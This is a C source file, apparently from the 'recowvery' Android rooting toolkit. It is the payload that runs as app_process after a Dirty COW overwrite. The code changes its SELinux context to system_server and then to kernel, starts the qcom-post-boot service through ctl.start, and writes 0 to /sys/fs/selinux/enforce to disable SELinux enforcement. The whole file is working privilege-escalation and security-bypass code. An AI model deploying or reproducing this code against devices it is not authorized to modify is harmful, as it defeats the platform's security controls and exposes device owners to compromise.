#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <fcntl.h>
#include <sys/stat.h>

#define APP_NAME  "recowvery"
#ifdef _64BIT
#define HOST_NAME "app_process64"
#else
#define HOST_NAME "app_process32"
#endif

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO,  APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { __android_log_print(ANDROID_LOG_ERROR, APP_NAME, __VA_ARGS__); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#else
#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#endif

#define SEP LOGV("------------")

#define CONTEXT_SYS "u:r:system_server:s0"
#define PROP_KEY    "ctl.start"
#define PROP_VAL    "qcom-post-boot"


#define CONTEXT_SYS_SE "u:object_r:selinuxfs:s0"
#define CONTEXT_SYS_KERNEL "u:object_r:kernel:s0"

#define SE_PATCH "/sys/fs/selinux/enforce"

static int set_match_con(char *con)
{
	int ret;
	char *conn = 0;

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		return 1;
	}

	LOGV("Current selinux context: %s", conn);

	ret = setcon(con);
	if (ret) {
		LOGE("Unable to set security context to '%s'!", con);
		return 1;
	}
	LOGV("Set context to '%s'", con);

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		return 1;
	}

	LOGV("Current security context: %s", conn);

	if (strcmp(conn, con)) {
		LOGE("Current security context '%s' does not match '%s'!, try to set another context",
			conn, con);
		return 1;
	}
	return 0;
}

static int setenforce(int value)
{
	int fd, ret, check;
	char buf[20];

	SEP;
	LOGV("Set selinux to P mode");
	fd = open(SE_PATCH, O_RDWR);
	if (fd < 0)
		return -1;

	snprintf(buf, sizeof buf, "%d", value);
	ret = write(fd, buf, strlen(buf));
	memset(buf, 0, sizeof buf);
	read(fd, buf, sizeof buf - 1);
	LOGV("now selinux mode is %s", buf);
	close(fd);
	if (ret < 0)
		return -1;

	SEP;
	return 0;
}

int main(void)
{
	int ret = 0;
	char *conn = 0;

	LOGV("Welcome to %s! (%s)", APP_NAME, HOST_NAME);
	SEP;

	set_match_con(CONTEXT_SYS);

	LOGV("Setting property '%s' to '%s'", PROP_KEY, PROP_VAL);

	ret = property_set(PROP_KEY, PROP_VAL);

	set_match_con(CONTEXT_SYS_KERNEL);

	if(setenforce(0)){
		LOGE("Failed to set selinux mode!");
		goto oops;
	}

	SEP;

	LOGV("Run on your PC or device to see progress: adb logcat -s recowvery");
	/*
	 * we should wait 3 minutes to allow the flash to complete
	 * and for the user to reboot their device
	 */
	LOGV("Waiting 10 seconds to try again (in case it didn't start or you forgot to dirtycow applypatch first)...");
	sleep(10);
	return 0;
oops:
	/*
	 * we should wait 20 seconds just so Zygote isn't
	 * being constantly restarted
	 */
	LOGE("Error %d: %s", ret, strerror(ret));
	LOGE("Waiting 20 seconds for next try...");
	sleep(20);
	return ret;
}
